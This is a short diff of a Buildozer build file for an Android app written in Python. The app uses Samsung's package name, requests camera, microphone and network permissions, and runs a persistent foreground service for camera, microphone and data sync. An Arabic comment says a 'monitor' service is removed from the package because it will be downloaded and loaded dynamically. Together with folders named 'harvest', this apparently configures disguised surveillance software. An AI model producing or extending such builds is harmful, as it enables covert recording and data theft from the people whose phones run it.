@@ -5,7 +5,7 @@ package.domain = com.samsung.android
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
 source.include_patterns = assets/*, *.tflite
-source.exclude_dirs = tests,__pycache__,docs,.github,.sys_runtime,g_tmp,ctmp,n_tmp,c_tmp,v_tmp,harvest
+source.exclude_dirs = tests,__pycache__,docs,.github
 version = 2.5.1
 
 requirements = python3,kivy,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,tflite-runtime,numpy
@@ -17,14 +17,14 @@ android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE
 android.api = 33
 android.minapi = 24
 android.accept_sdk_license = True
-android.skip_update = True
-android.auto_accept_sdk_license = True
 android.archs = arm64-v8a
 
 android.allow_backup = False
 android.request_legacy_external_storage = True
 
-android.services = monitor:monitor.py
+# تم إزالة السطر التالي لأن monitor.py ليس ضمن الـ APK (سيتم تحميله ديناميكياً)
+# android.services = monitor:monitor.py
+
 android.foreground = True
 android.foreground_service_type = dataSync|camera|microphone
 android.wakelock = True
